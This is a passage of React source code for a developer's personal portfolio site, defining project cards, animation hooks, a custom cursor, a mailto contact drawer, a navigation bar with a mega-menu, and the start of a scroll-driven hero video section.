import { useState, useEffect, useRef } from "react";
import { BrowserRouter as Router, Routes, Route, Link, useLocation } from "react-router-dom";
import BlogList from "./blog/BlogList";
import BlogPost from "./blog/BlogPost";
import CaseStudyPost from "./blog/CaseStudyPost";
import BLOG_POSTS from "./blog/blogData";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const aqibPhoto = "/MY%20pfp.png";

// â”€â”€â”€ DATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const ROLES = [
  "Code.",
  "AI.",
  "Automation."
];
// Each card shows `image` at rest and swaps to `video` on hover. Both files
// live in /public. `href` is where the card links to.
const PROJECTS = [
  {
    id: "01",
    title: "SOCAN",
    category: "Music",
    type: "Non-Profit Website",
    image: "/socan.webp",
    video: "/socan.mp4",
    href: "https://www.socan.com/",
  },
  {
    id: "02",
    title: "VALIDSOFT",
    category: "Marketing",
    type: "Website",
    image: "/validsoft-600x720.webp",
    video: "/validsoft.mp4",
    href: "https://www.validsoft.com/",
  },
  {
    id: "03",
    title: "UNILOCK",
    category: "Construction",
    type: "Product website",
    image: "/unilock_3.webp",
    video: "/unilock_4.mp4",
    href: "https://unilock.com/",
  },
  {
    id: "04",
    title: "FRANCHISE BOSTON",
    category: "Restaurant",
    type: "Microsite",
    image: "/franchise-boston.webp",
    video: "/franchise-boston.mp4",
    href: "https://www.ownabostons.com/",
  },
  {
    id: "05",
    title: "BASE1",
    category: "Marketing",
    type: "Website",
    image: "/baseone-prev-img-1.webp",
    video: "/base1.mp4",
    href: "https://baseone.uk/",
  },
  {
    id: "06",
    title: "STEELFIRE",
    category: "Industrial & Manufacturing",
    type: "Product website",
    image: "/steelfire.webp",
    video: "/steelfire.mp4",
    href: "https://www.steelfire.com/",
  },
];

const STATS = [
  { val: "50+", label: "Projects" }, { val: "2+yr", label: "Experience" },
  { val: "3", label: "Continents" }, { val: "100%", label: "Remote" },
];

const TECHNOLOGY_MENU = {
    title: "Technologies",
    layout: [
      [
        { heading: "Technology Stack", items: ["Simple", "Middle", "Enterprise"] },
        { heading: "Backend", items: ["Python", "Node", "Laravel", "PHP"], pill: "6+ technologies" },
      ],
      [
        { heading: "Digital Design", items: ["Figma", "Photoshop", "Illustrator", "Framer"] },
        { heading: "DevOps", items: ["AWS", "Firebase", "GCP", "Azure"], pill: "6+ technologies" },
      ],
      [
        { heading: "Frontend", items: ["React", "Angular", "Vue.js", "Flutter"], pill: "6+ technologies" },
        { heading: "Database", items: [] },
        { heading: "Cloud", items: [] },
        { heading: "Mobile Apps", items: [] },
      ],
    ].map(col => col.map(block => ({ ...block, items: block.items.map(label => ({ label, href: "#our-technologies" })) }))),
};

// â”€â”€â”€ HOOKS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function useTypewriter(words) {
  const [text, setText] = useState("");
  const [wi, setWi] = useState(0);
  const [ci, setCi] = useState(0);
  const [del, setDel] = useState(false);
  useEffect(() => {
    const w = words[wi];
    const isFinished = !del && ci === w.length;
    const delay = isFinished ? 1600 : del ? 42 : 88;
    const t = setTimeout(() => {
      if (!del) {
        if (ci < w.length) { setText(w.slice(0, ci + 1)); setCi(c => c + 1); }
        else setDel(true);
      } else if (ci > 0) {
        setText(w.slice(0, ci - 1)); setCi(c => c - 1);
      } else {
        setDel(false); setWi(i => (i + 1) % words.length);
      }
    }, delay);
    return () => clearTimeout(t);
  }, [ci, del, wi, words]);
  return text;
}

function useInView(threshold = 0.1) {
  const ref = useRef(null);
  const [inView, setInView] = useState(false);
  useEffect(() => {
    const obs = new IntersectionObserver(
      ([e]) => { if (e.isIntersecting) setInView(true); },
      { threshold }
    );
    if (ref.current) obs.observe(ref.current);
    return () => obs.disconnect();
  }, [threshold]);
  return [ref, inView];
}

function useMouse() {
  const [pos, setPos] = useState({ x: -300, y: -300 });
  useEffect(() => {
    const h = e => setPos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", h);
    return () => window.removeEventListener("mousemove", h);
  }, []);
  return pos;
}

// One state update per animation frame â€” raw scroll events fire far more often
// than the screen repaints, and re-rendering on every one of them is what makes
// scroll-linked animation stutter.
function useScrollY() {
  const [y, setY] = useState(0);
  useEffect(() => {
    let raf = 0;
    const h = () => {
      if (raf) return;
      raf = requestAnimationFrame(() => { raf = 0; setY(window.scrollY); });
    };
    window.addEventListener("scroll", h, { passive: true });
    return () => { window.removeEventListener("scroll", h); cancelAnimationFrame(raf); };
  }, []);
  return y;
}

function useIsMobile() {
  const [m, setM] = useState(false);
  useEffect(() => {
    const check = () => setM(window.innerWidth < 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  return m;
}

// â”€â”€â”€ CURSOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Cursor({ pos, isMobile }) {
  const [trail, setTrail] = useState({ x: pos.x, y: pos.y });
  useEffect(() => {
    let raf;
    const lerp = () => {
      setTrail(t => ({ x: t.x + (pos.x - t.x) * 0.1, y: t.y + (pos.y - t.y) * 0.1 }));
      raf = requestAnimationFrame(lerp);
    };
    raf = requestAnimationFrame(lerp);
    return () => cancelAnimationFrame(raf);
  }, [pos]);

  if (isMobile) return null;
  return (
    <>
      <div style={{
        position: "fixed", left: pos.x - 4, top: pos.y - 4,
        width: 8, height: 8, borderRadius: "50%",
        background: "#eef2f6", pointerEvents: "none", zIndex: 9999,
      }} />
      <div style={{
        position: "fixed", left: trail.x - 20, top: trail.y - 20,
        width: 40, height: 40, borderRadius: "50%",
        border: "1px solid rgba(255,255,255,0.35)",
        pointerEvents: "none", zIndex: 9998,
      }} />
    </>
  );
}

// â”€â”€â”€ FLOATING CONTACT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function ContactDrawer({ side, onClose }) {
  const [form, setForm] = useState({ name: "", phone: "", email: "", message: "" });

  const submit = e => {
    e.preventDefault();
    const subject = encodeURIComponent(`New project inquiry from ${form.name || "website visitor"}`);
    const body = encodeURIComponent(
      `Name: ${form.name}\nPhone: ${form.phone}\nEmail: ${form.email}\n\nMessage:\n${form.message}`
    );
    window.location.href = `mailto:Aqibfahraz@gmail.com?subject=${subject}&body=${body}`;
  };

  const fieldStyle = {
    width: "100%", border: 0, borderBottom: "1px solid rgba(2,6,10,0.35)",
    padding: "12px 0 10px", outline: "none", background: "transparent",
    color: "#747474", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: "clamp(22px,2.2vw,32px)",
  };

  return (
    <div role="dialog" aria-modal="true" aria-label="Contact form" style={{ position: "fixed", inset: 0, zIndex: 1000 }}>
      <button aria-label="Close contact form" onClick={onClose} style={{
        position: "absolute", inset: 0, width: "100%", height: "100%", border: 0,
        background: "rgba(2,6,10,0.56)", backdropFilter: "blur(12px)", cursor: "pointer",
      }} />
      <form onSubmit={submit} style={{
        position: "absolute", top: 0, bottom: 0, [side]: 0,
        width: "min(68vw, 1050px)", maxWidth: "100%", height: "100dvh", overflow: "hidden",
        boxSizing: "border-box", background: "#f5f5f3", color: "#02060a", padding: "clamp(20px,3.2vw,46px) clamp(24px,6vw,110px)",
        boxShadow: "0 0 80px rgba(0,0,0,0.28)", animation: `${side === "right" ? "drawerRight" : "drawerLeft"} 0.45s cubic-bezier(.22,1,.36,1) both`,
      }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "clamp(18px,3.5vw,42px)" }}>
          <div style={{ fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: "clamp(21px,2.3vw,32px)", lineHeight: 1.05, letterSpacing: "-0.04em" }}>
            START SIMPLE -<br />JUST WRITE TO US
          </div>
          <button type="button" onClick={onClose} style={{ border: 0, background: "none", fontFamily: "'Space Mono',monospace", fontSize: 12, cursor: "pointer", color: "#02060a" }}>
            CLOSE <span style={{ fontSize: 20, verticalAlign: "-2px" }}>x</span>
          </button>
        </div>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Name)
          <input required value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} style={fieldStyle} autoFocus />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Phone)*
          <input required value={form.phone} onChange={e => setForm({ ...form, phone: e.target.value })} style={fieldStyle} inputMode="tel" />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Email)
          <input required type="email" value={form.email} onChange={e => setForm({ ...form, email: e.target.value })} style={fieldStyle} />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14 }}>
          (Your Message)
          <textarea required value={form.message} onChange={e => setForm({ ...form, message: e.target.value })} style={{ ...fieldStyle, minHeight: "clamp(58px,8vh,96px)", resize: "none" }} />
        </label>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginTop: "clamp(14px,2.5vh,28px)" }}>
          <button type="submit" style={{ border: 0, borderRadius: 999, background: "#02060a", color: "#fff", padding: "17px 34px", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 16, fontWeight: 700, cursor: "pointer" }}>SEND MESSAGE</button>
          <button type="button" onClick={onClose} aria-label="Close contact form" style={{ width: 52, height: 52, border: 0, borderRadius: "50%", background: "#02060a", color: "#fff", fontSize: 26, cursor: "pointer" }}>x</button>
        </div>
      </form>
    </div>
  );
}

function FloatingContact({ onOpenContact }) {
  const btnStyle = {
    display: "flex", alignItems: "center", justifyContent: "center",
    width: "clamp(44px,6vw,52px)", height: "clamp(44px,6vw,52px)",
    borderRadius: "50%", background: "#eef2f6",
    border: "1px solid rgba(255,255,255,0.14)", color: "#02060a",
    textDecoration: "none", transition: "all 0.25s ease",
  };
  return (
    <div style={{
      position: "fixed", right: "clamp(16px,3vw,28px)", bottom: "clamp(16px,3vw,28px)",
      zIndex: 400, display: "flex", flexDirection: "column", gap: 12,
    }}>
      <button type="button" aria-label="Start a conversation" style={{ ...btnStyle, border: btnStyle.border, cursor: "pointer" }} onClick={() => onOpenContact("right")}
        onMouseEnter={e => { e.currentTarget.style.background = "#12161a"; e.currentTarget.style.color = "#eef2f6"; }}
        onMouseLeave={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
      >
        <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
          <path d="M12 2C6.48 2 2 5.94 2 10.8c0 2.78 1.47 5.26 3.76 6.87-.13 1.13-.5 2.5-1.23 3.86 1.61-.29 3.16-.98 4.34-1.85 1.01.28 2.08.42 3.13.42 5.52 0 10-3.94 10-8.8S17.52 2 12 2z" strokeLinejoin="round" />
          <circle cx="8" cy="10.8" r="1" fill="currentColor" stroke="none" />
          <circle cx="12" cy="10.8" r="1" fill="currentColor" stroke="none" />
          <circle cx="16" cy="10.8" r="1" fill="currentColor" stroke="none" />
        </svg>
      </button>
      <button type="button" aria-label="Email Aqib Faraz" style={{ ...btnStyle, border: btnStyle.border, cursor: "pointer" }} onClick={() => onOpenContact("right")}
        onMouseEnter={e => { e.currentTarget.style.background = "#12161a"; e.currentTarget.style.color = "#eef2f6"; }}
        onMouseLeave={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
      >
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1C10.61 21 3 13.39 3 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.46.57 3.58a1 1 0 01-.25 1.01l-2.2 2.2z" />
        </svg>
      </button>
    </div>
  );
}

// â”€â”€â”€ NAV DROPDOWN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Reusable mega-menu: [title + description | divider | N-column grid | dark
// featured-project panel]. Same shell for Work/Stack/Blog â€” only `menu` differs.
function NavDropdown({ menu }) {
  const [show, setShow] = useState(false);
  useEffect(() => {
    const raf = requestAnimationFrame(() => setShow(true));
    return () => cancelAnimationFrame(raf);
  }, []);

  return (
    <div style={{
      position: "fixed", top: 64, left: 0, right: 0, zIndex: 501,
      padding: "0 clamp(20px,5vw,60px) 20px", pointerEvents: "none",
    }}>
      <div style={{
        background: "#fff", borderRadius: 10, overflow: "hidden",
        display: "flex", boxShadow: "0 30px 70px rgba(0,0,0,0.5)",
        maxWidth: 1240, margin: "0 auto", pointerEvents: "auto",
        opacity: show ? 1 : 0, transform: show ? "translateY(0)" : "translateY(-10px)",
        transition: "opacity 0.3s ease, transform 0.3s ease",
      }}>
        {/* Sidebar */}
        <div style={{
          width: "clamp(200px,18vw,260px)", flexShrink: 0,
          padding: "clamp(28px,3.5vw,44px) clamp(20px,2.5vw,32px)",
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          minHeight: 340,
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(22px,2.4vw,28px)", letterSpacing: "0.02em",
            textTransform: "uppercase", color: "#02060a",
          }}>{menu.title}</div>
          <p style={{
            margin: 0, fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
            lineHeight: 1.55, color: "rgba(2,6,10,0.6)", maxWidth: 190,
          }}>{menu.description}</p>
        </div>

        {/* Divider */}
        <div style={{ width: 1, background: "rgba(2,6,10,0.1)", margin: "32px 0", flexShrink: 0 }} />

        {/* Columns */}
        <div style={{
          flex: 1, padding: "clamp(28px,3.5vw,44px) clamp(24px,3vw,40px)",
          display: "grid", gridTemplateColumns: "repeat(3,minmax(140px,1fr))",
          gap: "36px 32px", alignContent: "start",
        }}>
          {/* menu.layout is column-major (each column stacks its own blocks);
             menu.columns is a flat list, one block per column â€” normalize both to the same shape */}
          {(menu.layout || menu.columns.map(col => [col])).map((column, ci) => (
            <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 26 }}>
              {column.map((block, bi) => (
                <div key={bi}>
                  {block.items.length > 0 && block.heading && (
                    <a href={menu.title === "Services" ? "#services" : menu.title === "Technologies" ? "#our-technologies" : "#work-proud"} style={{
                      display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 11,
                      letterSpacing: "0.08em", textTransform: "uppercase",
                      color: "rgba(2,6,10,0.35)", marginBottom: 14, textDecoration: "none",
                      transition: "color 0.2s",
                    }}
                      onMouseEnter={e => e.currentTarget.style.color = "#02060a"}
                      onMouseLeave={e => e.currentTarget.style.color = "rgba(2,6,10,0.35)"}
                    >{block.heading}</a>
                  )}
                  {block.items.length === 0 ? (
                    <a href="#our-technologies" style={{
                      display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                      fontSize: 16, letterSpacing: "0.01em", textTransform: "uppercase",
                      color: "#02060a", textDecoration: "none", transition: "opacity 0.2s",
                    }}
                      onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                      onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                    >{block.heading}</a>
                  ) : (
                    <>
                      <div style={{ display: "flex", flexDirection: "column", gap: 18 }}>
                        {block.items.map(it => (
                          <a key={it.label} href={it.href} style={{
                            display: "flex", alignItems: "flex-start", gap: 10,
                            paddingLeft: block.heading ? 0 : 15,
                            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
                            fontWeight: 500, letterSpacing: "0.02em", textTransform: "uppercase",
                            color: "#02060a", textDecoration: "none", lineHeight: 1.3,
                            transition: "opacity 0.2s",
                          }}
                            onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                          >
                            {block.heading && (
                              <span style={{
                                width: 5, height: 5, borderRadius: "50%", marginTop: 6,
                                border: "1px solid rgba(2,6,10,0.4)", flexShrink: 0,
                              }} />
                            )}
                            {it.label}
                          </a>
                        ))}
                      </div>
                      {block.pill && (
                        <span style={{
                          display: "inline-block", marginTop: 14,
                          fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 11, fontWeight: 500,
                          color: "rgba(2,6,10,0.55)", background: "rgba(2,6,10,0.06)",
                          borderRadius: 999, padding: "5px 12px",
                        }}>{block.pill}</span>
                      )}
                    </>
                  )}
                </div>
              ))}
            </div>
          ))}
        </div>

        {/* Featured project panel */}
        <div style={{
          width: "clamp(200px,19vw,270px)", flexShrink: 0,
          background: "#333", padding: "clamp(20px,2.5vw,28px)",
          display: "flex", flexDirection: "column", gap: 16,
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 15,
            letterSpacing: "0.02em", textTransform: "uppercase", color: "#eef2f6",
          }}>New Project</div>
          <div style={{
            aspectRatio: "1 / 1", borderRadius: 6, overflow: "hidden", background: "#1a1a1a",
          }}>
            <img src="/new%20projects.jpg" alt="Latest project preview" style={{
              width: "100%", height: "100%", objectFit: "cover", display: "block",
            }} />
          </div>
        </div>
      </div>
    </div>
  );
}

// â”€â”€â”€ NAV â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const NAV_LINKS = [
  { label: "Portfolio", href: "#work-proud" },
  { label: "Services", href: "#services" },
  { label: "Technologies", href: "#our-technologies" },
];

function Nav({ scrollY, isMobile, onOpenContact }) {
  const [open, setOpen] = useState(false);
  const compactViewport = isMobile || (typeof window !== "undefined" && window.innerWidth <= 1024);
  const tabletViewport = !isMobile && compactViewport;
  const solid = scrollY > 50;

  const linkStyle = {
    display: "flex", alignItems: "center", gap: 4,
    fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13,
    fontWeight: 600, letterSpacing: "0.01em",
    color: "rgba(255,255,255,0.5)", textDecoration: "none",
    background: "none", border: "none", cursor: "pointer", padding: 0,
    transition: "color 0.2s",
  };

  return (
    <div>
      <nav style={{
        // At the top it's a plain full-width bar; once scrolled it lifts into a
        // floating rounded capsule inset from the edges.
        position: "fixed", zIndex: 500,
        top: solid ? "clamp(8px,1vw,16px)" : 0,
        left: solid ? "clamp(10px,1.6vw,28px)" : 0,
        right: solid ? "clamp(10px,1.6vw,28px)" : 0,
        height: 64, display: "flex", alignItems: "center",
        justifyContent: "space-between",
        padding: solid
          ? "0 clamp(16px,2.4vw,34px)"
          : "0 clamp(20px,5vw,60px)",
        // frosted glass rather than a solid fill
        background: solid ? "rgba(255,255,255,0.06)" : "transparent",
        backdropFilter: solid ? "blur(22px) saturate(160%)" : "none",
        WebkitBackdropFilter: solid ? "blur(22px) saturate(160%)" : "none",
        borderRadius: solid ? 999 : 0,
        border: solid ? "1px solid rgba(255,255,255,0.14)" : "1px solid transparent",
        boxShadow: solid ? "0 14px 40px rgba(0,0,0,0.35)" : "none",
        opacity: compactViewport && scrollY > 30 ? 0 : 1,
        pointerEvents: compactViewport && scrollY > 30 ? "none" : "auto",
        transition: "all 0.45s cubic-bezier(0.25,1,0.5,1)",
      }}>
        {/* Personal name lockup */}
        <a href="/" style={{
          display: "inline-block", textDecoration: "none", color: "#eef2f6",
          fontFamily: "'Plus Jakarta Sans',sans-serif", lineHeight: 1,
        }}>
          <span style={{
            display: "block", fontSize: 17, fontWeight: 800, letterSpacing: "-0.02em",
          }}>Aqib Faraz</span>
        </a>

        {!compactViewport && (
          <div style={{ display: "flex", gap: "clamp(14px,2.5vw,36px)", alignItems: "center" }}>
            {NAV_LINKS.map(({ label, href }) => {
              const style = {
                ...linkStyle,
                color: "rgba(255,255,255,0.5)",
              };
              return <a key={label} href={href} style={style}
                onMouseOver={e => e.currentTarget.style.color = "#eef2f6"}
                onMouseOut={e => e.currentTarget.style.color = "rgba(255,255,255,0.5)"}
              >{label}</a>;
            })}
            <a href="/blog" style={linkStyle}
              onMouseOver={e => e.currentTarget.style.color = "#eef2f6"}
              onMouseOut={e => e.currentTarget.style.color = "rgba(255,255,255,0.5)"}
            >Blog</a>
          </div>
        )}

        {!compactViewport && (
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <button type="button" onClick={() => onOpenContact("right")} style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13,
              fontWeight: 700, letterSpacing: "0.01em",
              color: "#02060a", background: "#eef2f6", borderRadius: 999,
              padding: "10px 22px", border: 0, cursor: "pointer",
              transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.8"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >Let's Talk</button>
            <a href="#become-client" aria-label="Go to contact" style={{
              display: "flex", alignItems: "center", justifyContent: "center",
              width: 36, height: 36, borderRadius: "50%",
              border: "1px solid rgba(255,255,255,0.22)", color: "#eef2f6", flexShrink: 0,
              transition: "all 0.25s ease",
            }}
              onMouseEnter={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
              onMouseLeave={e => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.color = "#eef2f6"; }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
          </div>
        )}

        {compactViewport && (
          <button type="button" onClick={() => setOpen(o => !o)} aria-label={open ? "Close menu" : "Open menu"} style={{
            width: 42, height: 38, display: "grid", placeItems: "center",
            padding: 0, border: 0, background: "transparent", color: "#eef2f6", cursor: "pointer",
          }}>
            <span style={{ display: "flex", flexDirection: "column", gap: 5 }}>
              <span style={{ width: 25, height: 1.5, background: "currentColor", transform: open ? "translateY(3.25px) rotate(45deg)" : "none", transition: "transform 0.25s ease" }} />
              <span style={{ width: 25, height: 1.5, background: "currentColor", transform: open ? "translateY(-3.25px) rotate(-45deg)" : "none", transition: "transform 0.25s ease" }} />
            </span>
          </button>
        )}

      </nav>

      {compactViewport && scrollY > 30 && <div style={{
        position: "fixed", zIndex: 700,
        left: tabletViewport ? 24 : "clamp(6px,1.5vw,16px)",
        right: tabletViewport ? 24 : "clamp(6px,1.5vw,16px)",
        bottom: tabletViewport ? 16 : 10,
        display: "flex", justifyContent: "center", gap: 16,
        padding: "7px 0", border: "1px solid rgba(255,255,255,0.12)",
        borderRadius: 999, background: "rgba(18,18,18,0.35)",
        backdropFilter: "blur(18px)", boxShadow: "0 -8px 24px rgba(0,0,0,.18)",
      }}>
        <button onClick={() => setOpen(o => !o)} aria-label="Toggle menu" style={{ width: 54, height: 38, border: 0, borderRadius: 999, background: "transparent", color: "#f3f3f3", display: "grid", placeItems: "center", cursor: "pointer" }}>
          <span style={{ display: "flex", flexDirection: "column", gap: 5 }}><span style={{ width: 22, height: 1.5, background: "currentColor", transform: open ? "translateY(3.25px) rotate(45deg)" : "none", transition: "transform 0.25s ease" }} /><span style={{ width: 22, height: 1.5, background: "currentColor", transform: open ? "translateY(-3.25px) rotate(-45deg)" : "none", transition: "transform 0.25s ease" }} /></span>
        </button>
        <a href="mailto:Aqibfahraz@gmail.com" aria-label="Email Aqib Faraz" style={{ width: 54, height: 38, borderRadius: 999, display: "grid", placeItems: "center", color: "#f3f3f3" }}><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8"><rect x="3" y="5" width="18" height="14" rx="2" /><path d="m4 7 8 6 8-6" /></svg></a>
      </div>}

      {compactViewport && open && (
        <div style={{
          position: "fixed", top: scrollY > 30 ? 18 : 70, left: "clamp(8px,3vw,24px)", right: "clamp(8px,3vw,24px)", bottom: scrollY > 30 ? 70 : 18, zIndex: 800,
          background: "#f5f5f3", borderRadius: 6,
          padding: "24px clamp(22px,6vw,44px) 26px",
          boxShadow: "0 20px 60px rgba(0,0,0,0.42)",
        }}>
          {NAV_LINKS.map(({ label, href }) => (
            <a key={label} href={href || "#contact"} onClick={() => setOpen(false)} style={{
              display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif",
              fontSize: 15, fontWeight: 600,
              color: "#111", textDecoration: "none",
              padding: "18px 0", borderBottom: "1px solid rgba(0,0,0,0.1)",
            }}>{label}</a>
          ))}
          <a href="/blog" onClick={() => setOpen(false)} style={{
            display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif",
            fontSize: 15, fontWeight: 600,
            color: "#111", textDecoration: "none",
            padding: "18px 0", borderBottom: "1px solid rgba(0,0,0,0.1)",
          }}>Blog</a>
          <button type="button" onClick={() => onOpenContact("right")} style={{
            display: "inline-block", marginTop: 20,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13, fontWeight: 700,
            color: "#fff", background: "#02060a", borderRadius: 999,
            padding: "12px 26px", border: 0, cursor: "pointer",
          }}>Let's Talk</button>
        </div>
      )}
    </div>
  );
}

// â”€â”€â”€ HERO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Hero({ isMobile, scrollY }) {
  const typed = useTypewriter(ROLES);
  const [vis, setVis] = useState(false);
  const [videoHov, setVideoHov] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);
  const heroVideoRef = useRef(null);
  const [showProfilePhoto, setShowProfilePhoto] = useState(false);
  const [isNarrowDesktop, setIsNarrowDesktop] = useState(false);
  useEffect(() => {
    const check = () => {
      setShowProfilePhoto(window.innerWidth >= 1366);
      setIsNarrowDesktop(window.innerWidth < 1366);
    };
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  // â”€â”€ Pinned scroll-scrub video â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // The hero stays pinned (sticky) for GROW_LENGTH + HOLD_LENGTH px of
  // scrolling. During that stretch the page appears frozen:
  //   Â· first GROW_LENGTH px  â€” scroll drives the video from its small slot
  //                             up to fullscreen
  //   Â· next  HOLD_LENGTH px  â€” video sits fullscreen so it can actually be
  //                             watched before the page moves on
  // Past the pin, the hero unsticks and the next section scrolls up normally.
  // Scrolling back up runs it in reverse â€” everything is derived from scrollY
  // with no transition, so it tracks the scroll exactly.
  const GROW_LENGTH = 800, HOLD_LENGTH = 600;
  const PIN_LENGTH = GROW_LENGTH + HOLD_LENGTH;
  const progress = isMobile ? 0 : Math.min(Math.max(scrollY / GROW_LENGTH, 0), 1);
  const pinDone = scrollY > PIN_LENGTH;

  // Measure the resting slot once (and on resize) â€” never during scroll.
  const videoSlotRef = useRef(null);
  const [slot, setSlot] = useState(null);
  useEffect(() => {
    if (isMobile) return;
    const measure = () => {
      const el = videoSlotRef.current;
      if (!el) return;
      const r = el.getBoundingClientRect();
      // The hero is sticky, so the slot holds its viewport position for the
      // whole pin â€” no scroll offset to add there. Only once the pin is over
      // does the hero scroll away, so add that part back. (Measuring mid-pin
      // and adding scrollY was what pushed the video off its slot on resize.)
      const scrolledPastPin = Math.max(0, window.scrollY - PIN_LENGTH);
      setSlot({
        w: Math.round(r.width),
        h: Math.round(r.height),
        top: Math.round(r.top + scrolledPastPin),
        left: Math.round(r.left),
      });
    };
    measure();
    window.addEventListener("resize", measure);
    return () => window.removeEventListener("resize", measure);
  }, [isMobile]);

